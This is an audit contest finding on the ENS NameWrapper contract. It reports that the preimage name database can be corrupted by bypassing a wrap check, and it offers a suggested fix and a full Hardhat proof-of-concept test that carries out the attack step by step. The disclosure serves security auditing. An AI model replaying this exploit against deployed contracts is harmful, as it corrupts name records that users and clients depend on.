## Tags

- bug
- 2 (Med Risk)
- sponsor confirmed

# [[PNM-003] The preimage DB (i.e., `NameWrapper.names`) can be maliciously manipulated/corrupted](https://github.com/code-423n4/2022-07-ens-findings/issues/197) 

# Lines of code

https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520


# Vulnerability details

### Description

By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.

However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.

Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).

```solidity=
function setSubnodeOwner(
    bytes32 parentNode,
    string calldata label,
    address newOwner,
    uint32 fuses,
    uint64 expiry
)
    public
    onlyTokenOwner(parentNode)
    canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))
    returns (bytes32 node)
{
    bytes32 labelhash = keccak256(bytes(label));
    node = _makeNode(parentNode, labelhash);
    (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);
    if (ens.owner(node) != address(this)) {
        ens.setSubnodeOwner(parentNode, labelhash, address(this));
        _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);
    } else {
        _transferAndBurnFuses(node, newOwner, fuses, expiry);
    }
}
```

However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.

Consider the following attack scenario.

+ the hacker registers a 2LD domain, e.g., `base.eth`
+ he assigns a subdomain for himself, e.g., `sub1.base.eth`
     + the expiry of `sub1.base.eth` should be set as expired shortly
     + note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired
+ the hacker waits for expiration and unwraps his `sub1.base.eth`
+ the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract
+ the hacker re-wraps his `sub1.base.eth`
+ the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`
     + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty 
+ the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.
     + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\x03eth`

It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\x00` (note that a valid name should be like `\x03eth\x00`). However, the preimage BD can still be corrupted due to this issue.

### Notes

Discussed with the project member, Jeff Lau. 

If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.


### Suggested Fix

When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.

### PoC / Attack Scenario

There is a PoC file named `poc3.js`

To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.


#### poc3.js
```javascript=
const packet = require('dns-packet')
const { ethers } = require('hardhat')
const { utils } = ethers
const { use, expect } = require('chai')
const { solidity } = require('ethereum-waffle')
const n = require('eth-ens-namehash')
const provider = ethers.provider
const namehash = n.hash
const { evm } = require('../test-utils')
const { deploy } = require('../test-utils/contracts')
const { keccak256 } = require('ethers/lib/utils')

use(solidity)

const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label))
const ROOT_NODE =
  '0x0000000000000000000000000000000000000000000000000000000000000000'

const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'

function encodeName(name) {
  return '0x' + packet.name.encode(name).toString('hex')
}

const CANNOT_UNWRAP = 1
const CANNOT_BURN_FUSES = 2
const CANNOT_TRANSFER = 4
const CANNOT_SET_RESOLVER = 8
const CANNOT_SET_TTL = 16
const CANNOT_CREATE_SUBDOMAIN = 32
const PARENT_CANNOT_CONTROL = 64
const CAN_DO_EVERYTHING = 0

describe('PoC 3', () => {
  let ENSRegistry
  let BaseRegistrar
  let NameWrapper
  let NameWrapperV
  let MetaDataservice
  let signers
  let dev
  let victim
  let hacker
  let result
  let MAX_EXPIRY = 2n ** 64n - 1n

  before(async () => {
    signers = await ethers.getSigners()
    dev = await signers[0].getAddress()
    victim = await signers[1].getAddress()
    hacker = await signers[2].getAddress()

    EnsRegistry = await deploy('ENSRegistry')
    EnsRegistryV = EnsRegistry.connect(signers[1])
    EnsRegistryH = EnsRegistry.connect(signers[2])

    BaseRegistrar = await deploy(
      'BaseRegistrarImplementation',
      EnsRegistry.address,
      namehash('eth')
    )

    await BaseRegistrar.addController(dev)
    await BaseRegistrar.addController(victim)

    MetaDataservice = await deploy(
      'StaticMetadataService',
      'https://ens.domains'
    )

    NameWrapper = await deploy(
      'NameWrapper',
      EnsRegistry.address,
      BaseRegistrar.address,
      MetaDataservice.address
    )
    NameWrapperV = NameWrapper.connect(signers[1])
    NameWrapperH = NameWrapper.connect(signers[2])

    // setup .eth
    await EnsRegistry.setSubnodeOwner(
      ROOT_NODE,
      labelhash('eth'),
      BaseRegistrar.address
    )

    //make sure base registrar is owner of eth TLD
    expect(await EnsRegistry.owner(namehash('eth'))).to.equal(
      BaseRegistrar.address
    )
  })

  beforeEach(async () => {
    result = await ethers.provider.send('evm_snapshot')
  })
  afterEach(async () => {
    await ethers.provider.send('evm_revert', [result])
  })

  describe('name of a subdomain can be forged', () => {
    /*
     * Attack scenario:
     * 1. the hacker registers a 2LD domain, e.g., base.eth
     *
     * 2. he assigns a subdomain for himself, e.g., sub1.base.eth
     *      + the expiry of sub1.base.eth should be set as expired shortly
     *      + note that the expiry is for sub1.base.eth not base.eth, so it is safe to make it soonly expired
     *
     * 3. the hacker waits for expiration and unwraps his sub1.base.eth
     *
     * 4. the hacker invokes ens.setSubnodeOwner to set the owner of sub2.sub1.base.eth as NameWrapper contract
     *
     * 5. the hacker re-wraps his sub1.base.eth
     *
     * 6. the hacker invokes nameWrapper.setSubnodeOwner for sub2.sub1.base.eth
     *      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty
     *
     * 7. the hacker invokes nameWrapper.setSubnodeOwner for eht.sub2.sub1.base.eth.
     *      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes \03eth
     */
    before(async () => {
      await BaseRegistrar.addController(NameWrapper.address)
      await NameWrapper.setController(dev, true)
    })

    it('a passed test denotes a successful attack', async () => {
      const label = 'base'
      const labelHash = labelhash(label)
      const wrappedTokenId = namehash(label + '.eth')

      // registers a 2LD domain
      await NameWrapper.registerAndWrapETH2LD(
        label,
        hacker,
        86400,
        EMPTY_ADDRESS,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(
        NameWrapper.address
      )
      expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(
        NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)

      // signed a submomain for the hacker, with a soon-expired expiry
      const sub1Label = 'sub1'
      const sub1LabelHash = labelhash(sub1Label)
      const sub1Domain = sub1Label + '.' + label + '.eth'  // sub1.base.eth
      const wrappedSub1TokenId = namehash(sub1Domain)
      const block = await provider.getBlock(await provider.getBlockNumber())
      await NameWrapperH.setSubnodeOwner(
        wrappedTokenId,
        sub1Label,
        hacker,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        block.timestamp + 3600 // soonly expired
      )
      expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(
          NameWrapper.address
      )
      expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)
      expect(
          (await NameWrapper.getFuses(wrappedSub1TokenId))[0]
      ).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)

      // the hacker unwraps his wrappedSubTokenId
      await evm.advanceTime(7200)
      await NameWrapperH.unwrap(wrappedTokenId, sub1LabelHash, hacker)
      expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(hacker)

      // the hacker setSubnodeOwner, to set the owner of wrappedSub2TokenId as NameWrapper
      const sub2Label = 'sub2'
      const sub2LabelHash = labelhash(sub2Label)
      const sub2Domain = sub2Label + '.' + sub1Domain // sub2.sub1.base.eth
      const wrappedSub2TokenId = namehash(sub2Domain)
      await EnsRegistryH.setSubnodeOwner(
          wrappedSub1TokenId,
          sub2LabelHash,
          NameWrapper.address
      )
      expect(await EnsRegistry.owner(wrappedSub2TokenId)).to.equal(
          NameWrapper.address
      )

      // the hacker re-wraps the sub1node
      await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)
      await NameWrapperH.wrap(encodeName(sub1Domain), hacker, EMPTY_ADDRESS)
      expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)

      // the hackers setSubnodeOwner
      // XXX: till now, the hacker gets sub2Domain with no name in Namewrapper
      await NameWrapperH.setSubnodeOwner(
        wrappedSub1TokenId,
        sub2Label,
        hacker,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedSub2TokenId)).to.equal(hacker)
      expect(await NameWrapper.names(wrappedSub2TokenId)).to.equal('0x')

      // the hacker forge a fake root node
      const sub3Label = 'eth'
      const sub3LabelHash = labelhash(sub3Label)
      const sub3Domain = sub3Label + '.' + sub2Domain // eth.sub2.sub1.base.eth
      const wrappedSub3TokenId = namehash(sub3Domain)
      await NameWrapperH.setSubnodeOwner(
        wrappedSub2TokenId,
        sub3Label,
        hacker,
        PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,
        MAX_EXPIRY
      )
      expect(await NameWrapper.ownerOf(wrappedSub3TokenId)).to.equal(hacker)

      // ///////////////////////////
      // // Attack successed!
      // ///////////////////////////

      // XXX: names[wrappedSub3TokenId] becomes `\x03eth`
      expect(await NameWrapper.names(wrappedSub3TokenId)).to.equal('0x03657468') // \03eth
    })
  })
})
```

